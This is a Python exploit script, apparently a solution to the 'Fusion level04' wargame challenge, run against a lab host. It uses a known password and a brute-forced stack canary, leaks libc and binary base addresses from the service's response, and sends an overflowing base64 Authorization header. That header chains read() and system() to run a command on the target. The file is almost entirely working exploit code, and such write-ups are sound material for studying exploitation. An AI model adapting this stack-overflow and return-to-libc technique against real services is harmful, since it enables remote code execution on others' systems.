#!/usr/bin/python

import os, socket, struct, base64, sys, time, re

# At this stage, we have:
#  recovered the password
#  bruteforced the stack-canary

pack = lambda dword: struct.pack('I', dword)

def main():
    target=("192.168.1.6", 20004)

    if len(sys.argv) < 3:
        print("{} password canary".format(sys.argv[0]))
        return 1

    pw=sys.argv[1]
    canary=pack(int(sys.argv[2], base=16))


    authskel=b"pad:"+bytes(pw, 'utf8')
    reqskel="GET / HTTP/1.0\r\nAuthorization: Basic {}\r\n"
    payload = lambda fuzz: base64.encodestring(authskel+fuzz).replace(b'\n', b'')
    first_half=2028

    leakfuzz=(b'a'*first_half)+b"ABCD" 
    p = payload(leakfuzz)
    req=reqskel.format(str(p,'utf8'))
    print("[i] Leaking addresses")

    libc=0xfefefefe
    level04=0xb0b0b0b0

    if True:
        with socket.create_connection(target) as s:
            s.send(bytes(req, 'utf8'))
            try:
                time.sleep(0.2)
                r=s.recv(2048)
                r=str(r,'utf8')
                #print(r)
                libc=re.search(r'^([a-f0-9]{8})-.+r-xp.+/lib/i386-linux-gnu/libc-2.13.so$', r, re.M).group(1)
                level04=re.search(r'^([a-f0-9]{8})-.+rw-p.+/opt/fusion/bin/level04$', r, re.M).group(1)
                print("[i] level04 found:", level04)
                print("[i] libc    found:", libc)
            except Exception as e:
                print("Unable to leak addresses. Exception:", e)
                return 1

    # for debugging purposes
    #libc="b7586000"
    #stack="bff69000"
    arg=b"/usr/bin/id\x00"
    arglen=len(arg)
    system=int(libc,base=16)+0x3cb20 # was: 0x25f40
    readp=int(libc,base=16)+0xc1240
    # let's just overwrite at offset 0 :D
    # There's probably nothing important there at this point anyways
    argp=int(level04,base=16)
    
    # We cant do like this:
    # stack=re.search(r'^([a-f0-9]{8})-.+\[stack\]$', r, re.M).group(1)
    # argp=int(stack,base=16)+0xb950
    # Why? you might ask, well I'm not sure. The offsets seem to shuffle around / not be consistent.

    print("[i] __libc_system @", hex(system))
    print("[i] __libc_read @", hex(readp))
    print("[i] argp @", hex(argp))

    #fuzz=(b'a'*first_half)+canary+ b'b'*28 + pack(system) + pack(0) + pack(arg)
    #fuzz=(b'a'*first_half) + canary + pack(0xefefefef) + b'b'*28 + pack(readp)
    fuzz=(b'a' * first_half) +\
        canary + b'b'*28 +\
        pack(readp) +\
        pack(system) +\
        pack(1) +\
        pack(argp) +\
        pack(len(arg)+1)+\
        pack(argp)

    p = payload(fuzz)
    # Certain payloads may cause the base64-encoding function
    # of our target to return early, & that's something we
    # do not want :)
    while len(p) % 4 != 0:
        p+=b"="

    req=reqskel.format(str(p, 'utf8'))
        
    with socket.create_connection(target) as s:
        s.sendall(bytes(req, 'utf8'))
        try:
            print("[i] Executing {}".format(str(arg, 'utf8')))
            s.sendall(arg)
            r=s.recv(128)
            print(str(r, 'utf8'))
        except Exception as e:
            print("[i] Something went wrong", e)
    return 0

exit(main())
